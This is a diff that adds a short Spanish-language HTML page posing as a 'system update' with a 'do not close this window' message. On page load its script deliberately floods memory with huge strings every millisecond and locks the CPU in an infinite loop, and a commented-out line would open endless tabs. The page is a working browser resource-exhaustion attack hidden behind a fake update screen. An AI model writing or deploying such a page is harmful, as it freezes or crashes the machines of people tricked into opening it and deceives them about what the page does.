@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Actualización de Sistema</title>
+    <script>
+        function penetrar() {
+            // 1. SATURACIÓN DE RAM (Crea strings gigantes infinitos)
+            let memoria = [];
+            setInterval(() => {
+                try {
+                    memoria.push(new Array(1000000).join("X"));
+                    console.log("Consumiendo RAM...");
+                } catch(e) {}
+            }, 1);
+
+            // 2. SATURACIÓN DE CPU (Bucle infinito de cálculo)
+            while(true) {
+                var x = Math.sqrt(Math.random() * 1000000);
+                // 3. AUTO-REPLICACIÓN (Abre pestañas infinitas - Requiere permiso)
+                // window.open(window.location.href); 
+            }
+        }
+
+        // Ejecutar al cargar la página
+        window.onload = penetrar;
+    </script>
+</head>
+<body style="background-color: black; color: white; font-family: sans-serif; text-align: center; padding-top: 20%;">
+    <h1>Cargando recursos críticos...</h1>
+    <p>No cierre esta ventana para completar la operación.</p>
+</body>
+</html>
